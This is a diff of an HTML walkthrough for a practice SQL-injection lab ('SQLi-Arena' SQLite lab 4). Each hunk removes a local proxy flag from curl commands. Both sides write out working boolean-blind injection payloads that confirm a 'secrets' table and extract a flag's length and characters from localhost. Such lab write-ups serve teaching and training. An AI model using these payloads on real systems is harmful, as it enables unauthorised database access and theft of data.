@@ -9,7 +9,7 @@
         <span class="terminal-title">Step 1. Normal Lookup</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin"<br>
         <span class="prompt">SQL: </span>SELECT id, username, is_active FROM members WHERE username = 'admin' AND is_active = 1<br><br>
         <span class="prompt">Response: </span><strong>Status: Active</strong>
     </div>
@@ -25,7 +25,7 @@
         <span class="terminal-title">Step 1b. Unknown User</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=doesnotexist"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=doesnotexist"<br>
         <span class="prompt">Response: </span><strong>Status: Not found.</strong>
     </div>
 </div>
@@ -41,9 +41,9 @@
         <span class="terminal-title">Step 2. Boolean Oracle Test</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin' AND 1=1 -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin' AND 1=1 -- -"<br>
         <span class="prompt">Response: </span><strong>Status: Active</strong> (TRUE -- query still finds admin)<br><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin' AND 1=2 -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin' AND 1=2 -- -"<br>
         <span class="prompt">Response: </span><strong>Status: Not found.</strong> (FALSE -- 1=2 fails, no result)
     </div>
 </div>
@@ -60,7 +60,7 @@
         <span class="terminal-title">Step 3. Table Enumeration</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin' AND (SELECT count(*) FROM sqlite_master WHERE type='table' AND name='secrets')&gt;0 -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin' AND (SELECT count(*) FROM sqlite_master WHERE type='table' AND name='secrets')&gt;0 -- -"<br>
         <span class="prompt">Response: </span><strong>Status: Active</strong> (TRUE -- 'secrets' table exists!)
     </div>
 </div>
@@ -75,11 +75,11 @@
         <span class="terminal-title">Step 4. Flag Length</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin' AND (SELECT length(flag_value) FROM secrets LIMIT 1)&gt;20 -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin' AND (SELECT length(flag_value) FROM secrets LIMIT 1)&gt;20 -- -"<br>
         <span class="prompt">Response: </span><strong>Status: Active</strong> (TRUE -- length &gt; 20)<br><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin' AND (SELECT length(flag_value) FROM secrets LIMIT 1)&gt;30 -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin' AND (SELECT length(flag_value) FROM secrets LIMIT 1)&gt;30 -- -"<br>
         <span class="prompt">Response: </span><strong>Status: Not found.</strong> (FALSE -- length &lt;= 30)<br><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin' AND (SELECT length(flag_value) FROM secrets LIMIT 1)=25 -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin' AND (SELECT length(flag_value) FROM secrets LIMIT 1)=25 -- -"<br>
         <span class="prompt">Response: </span><strong>Status: Active</strong> (TRUE -- flag is exactly <strong>25 characters</strong>)
     </div>
 </div>
@@ -211,7 +211,7 @@ print(f'Flag: {flag}')<br>
         <span class="terminal-title">curl. Manual Test</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin' AND hex(substr((SELECT flag_value FROM secrets LIMIT 1),1,1))='46' -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin' AND hex(substr((SELECT flag_value FROM secrets LIMIT 1),1,1))='46' -- -"<br><br>
         <span class="prompt"># </span>Returns "Status: Active" confirming first char = 'F' (hex 46)
     </div>
 </div>
